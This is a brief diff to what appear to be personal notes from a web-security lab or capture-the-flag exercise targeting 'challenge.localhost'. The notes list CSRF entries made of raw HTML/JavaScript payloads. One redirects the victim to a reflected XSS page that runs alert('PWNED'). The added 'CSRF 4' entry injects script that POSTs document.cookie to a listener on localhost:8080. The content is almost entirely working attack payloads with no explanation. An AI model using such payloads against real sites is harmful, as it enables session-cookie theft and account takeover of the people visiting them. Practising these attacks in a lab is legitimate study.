@@ -101,3 +101,5 @@ except Exception as e:
       same but POST
     CSRF 3 
       <script>window.location.replace("http://challenge.localhost/ephemeral?msg=<script>alert('PWNED');"+"</sc"+"ript>");</script>
+    CSRF 4
+      <script>window.location.replace("http://challenge.localhost/ephemeral?msg=<script>fetch('http://localhost:8080', {method: 'POST', body: document.cookie});"+"</sc"+"ript>");</script>
